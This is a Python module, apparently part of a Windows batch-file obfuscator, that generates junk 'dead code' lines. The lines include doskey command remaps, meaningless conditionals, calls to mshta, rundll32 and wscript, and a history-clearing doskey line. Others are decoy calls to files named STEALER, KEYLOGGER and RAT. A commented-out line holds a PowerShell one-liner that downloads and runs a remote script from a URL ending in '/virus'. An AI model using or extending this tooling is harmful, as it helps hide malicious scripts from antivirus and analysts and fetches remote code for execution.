import random
import string


class DeadCode:
    def dead_code(self) -> str:
        """Returns a random string of dead code

        Returns:
            str: random string of dead code
        """

        dead_code_list = [
            DeadCode.doskey,
            DeadCode.if_statement,
            DeadCode.for_loop,
            DeadCode.better_kill,
            DeadCode.random_commands,
            DeadCode.powershell_command,
        ]

        choice = random.choice(dead_code_list)()

        return f"{DeadCode.random_scramble()}{choice}"

    @staticmethod
    def doskey() -> str:
        valid_commands = [
            "ASSOC",
            "ATTRIB",
            "BCDBOOT",
            "BCDEDIT",
            "BOOTREC",
            "BITSADMIN",
            "CACLS",
            "CALL",
            "CERTREQ",
            "CERTUTIL",
            "CD",
            "CHANGE",
            "CHCP",
            "CHDIR",
            "CHKDSK",
            "CHKNTFS",
            "CLS",
            "CMD",
            "COLOR",
            "COMP",
            "COMPACT",
            "CONVERT",
            "COPY",
            "DATE",
            "DEL",
            "DIR",
            "DISKPART",
            "DOSKEY",
            "DRIVERQUERY",
            "ECHO",
            "ENDLOCAL",
            "ERASE",
            "FC",
            "FIND",
            "FINDSTR",
            "FOR",
            "FORMAT",
            "FSUTIL",
            "FTYPE",
            "GOTO",
            "GPRESULT",
            "GRAFTABL",
            "HELP",
            "ICACLS",
            "IF",
            "LABEL",
            "MD",
            "MKDIR",
            "MKLINK",
            "MODE",
            "MORE",
            "MOVE",
            "OPENFILES",
            "PATH",
            "PAUSE",
            "POPD",
            "PRINT",
            "PROMPT",
            "PUSHD",
            "RD",
            "RECOVER",
            "REM",
            "REN",
            "RENAME",
            "REPLACE",
            "RMDIR",
            "ROBOCOPY",
            "SET",
            "SETLOCAL",
            "SC",
            "SCHTASKS",
            "SHIFT",
            "SHUTDOWN",
            "SORT",
            "START",
            "SUBST",
            "SYSTEMINFO",
            "TASKLIST",
            "TASKKILL",
            "TIME",
            "TITLE",
            "TREE",
            "TYPE",
            "VER",
            "VERIFY",
            "VOL",
            "XCOPY",
            "WMIC",
        ]

        f_random_command = random.choice(valid_commands)
        s_random_command = random.choice(valid_commands)
        while f_random_command == s_random_command:
            s_random_command = random.choice(valid_commands)
        command_template = f"doskey {f_random_command}={s_random_command}"
        return command_template

    @staticmethod
    def if_statement() -> str:
        good = DeadCode.random_commands()
        RANNUM = random.randint(32769, 99999)
        examples = [
            f"if %random% equ {RANNUM} ( {DeadCode.random_commands()} ) else ( {good} )",
            f"if not 0 neq 0 ( {good} ) else ( {DeadCode.random_commands()} )",
            f"if exist C:\\Windows\\System32 ( {good} ) else ( {DeadCode.random_commands()} )",
            f"if not %cd% == %cd% ( {DeadCode.random_commands()} ) else ( {good} )",
            f"if 0 equ 0 ( {good} ) else ( {DeadCode.random_commands()} )",
            f"if exist C:\\Windows\\System3 ( {DeadCode.random_commands()} ) else ( {good} )",
            f"if %cd% == %cd% ( {good} ) else ( {DeadCode.random_commands()} )",
            f"if chcp leq 1 ( {DeadCode.random_commands()} ) else ( {good} )",
            f"if %CD% == %__CD__% ( {DeadCode.random_commands()} ) else ( {good} )",
        ]

        return random.choice(examples)

    @staticmethod
    def for_loop() -> str:
        random_num = random.randint(1, 99)
        random_letter = random.choice(string.ascii_letters)
        loops = [
            f"for /l %%{random_letter} in ({random_num}, {random_num}, {random_num}) do ( {DeadCode.random_commands()} )",
            # f"for /F 'tokens=*' %%{random_letter} in ('1') do ( {DeadCode.random_commands()} )",
        ]

        return random.choice(loops)

    @staticmethod
    def powershell_command() -> str:
        commands = [
            # "powershell.exe -nop -c \"iex(new-object net.webclient).downloadstring('https://sped.lol/powershell/virus')\"",
            'powershell.exe -nop -c "Write-Host -NoNewLine $null"',
        ]

        return random.choice(commands)

    @staticmethod
    def random_commands() -> str:
        commands = [
            "mshta",
            "timeout 0 >nul",
            "echo %random% >nul",
            "rundll32",
            "cd %cd%",
            "wscript /b",
            # "C:\Windows\System32\cmd.exe /D /C ''",
            "rundll32",
            # This will also force clear command history
            "doskey /listsize=0",
        ]

        return random.choice(commands)

    @staticmethod
    def better_kill() -> str:
        bad_words = [
            "BAT_DLL",
            "BAD_EXE",
            "MALWARE",
            "STEALER",
            "GRABBER",
            "RAT",
            "TOKEN_LOGGER",
            "KEYLOGGER",
            "PASSWORD_GRABBER",
        ]
        error_commands = [
            f"call {random.choice(bad_words)}.exe >nul 2>nul",
            f"echo {random.choice(bad_words)}.exe >nul 2>nul",
            f"forfiles /p %cd% /m {random.choice(bad_words)}.exe /c 'cmd /c start @file' >nul 2>nul",
        ]

        return random.choice(error_commands)

    @staticmethod
    def random_scramble() -> str:
        t_f = random.choice([True, False])
        if t_f:
            return "%TO_SCRAMBLE_PLZ%"
        return ""
